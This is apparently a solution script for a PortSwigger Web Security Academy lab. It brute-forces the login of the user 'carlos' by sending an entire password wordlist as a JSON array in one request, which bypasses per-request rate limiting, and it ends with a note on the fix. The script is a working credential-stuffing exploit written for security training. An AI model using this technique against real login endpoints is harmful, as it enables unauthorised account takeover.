# Lab 13 — Broken brute-force protection, multiple credentials per request
# PortSwigger: https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request
#
# Vulnerability: The JSON login endpoint accepts an ARRAY for the 'password'
#                field — the server iterates through every value internally,
#                but the rate limiter only counts this as ONE request
# Aim:           Log in as carlos by submitting an entire wordlist in a single
#                HTTP request
#
# Technique:
#   Normal:  {"username":"carlos","password":"peter"}
#   Exploit: {"username":"carlos","password":["pass1","pass2",...,"passN"]}
#   The server tries every password in the array server-side. If ANY of them
#   is correct, the login succeeds — and the rate limiter only ever saw 1 request.
#
# Usage: python authentication_lab13.py <url> <passwords_file>

import sys
import urllib3
from proxies import proxies
from authentication_utils import banner, section, make_session, load_wordlist, check_status, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 13 — MULTIPLE CREDENTIALS PER REQUEST (JSON PASSWORD ARRAY)")

    if len(sys.argv) != 3:
        print("  Usage: python authentication_lab13.py <url> <passwords_file>")
        sys.exit(1)

    url, pfile = sys.argv[1], sys.argv[2]
    session = make_session(proxies)

    passwords = load_wordlist(pfile)
    if not passwords:
        sys.exit(1)

    print(f"\n  ➜  Submitting all {len(passwords)} passwords in a SINGLE JSON request\n")

    # The login endpoint on this lab accepts JSON directly (Content-Type: application/json)
    payload = {"username": "carlos", "password": passwords}

    r = session.post(
        f"{url}/login",
        json=payload,
        headers={"Content-Type": "application/json"},
        allow_redirects=False
    )

    print(f"  ℹ  Status: {r.status_code}")
    print(f"  ℹ  Location: {r.headers.get('Location', '(none)')}")

    if r.status_code == 302:
        print("\n  ✔  Login succeeded — one of the passwords in the array was correct")
        print_box("RESULT", "The array-based login bypassed per-request rate limiting entirely.")

        # Follow the redirect to confirm
        r2 = session.get(f"{url}/my-account", allow_redirects=True)
        check_status(r2, 200, "GET /my-account after array-based login")

        if "carlos" in r2.text:
            print("  ✔  Confirmed: now authenticated as carlos")
    else:
        print("\n  ✘  Login did not succeed with status 302.")
        print("     Check the wordlist contains carlos's actual password,")
        print("     or confirm the endpoint accepts JSON with an array password field.")
        print_box("Response body (truncated)", r.text[:500])

    print()
    print("  ℹ  This bypass doesn't evade the rate limiter — it makes the rate")
    print("     limiter irrelevant by front-loading an entire wordlist into one")
    print("     HTTP request. The fix is application-layer validation that")
    print("     'password' must be a scalar string, never an array.")
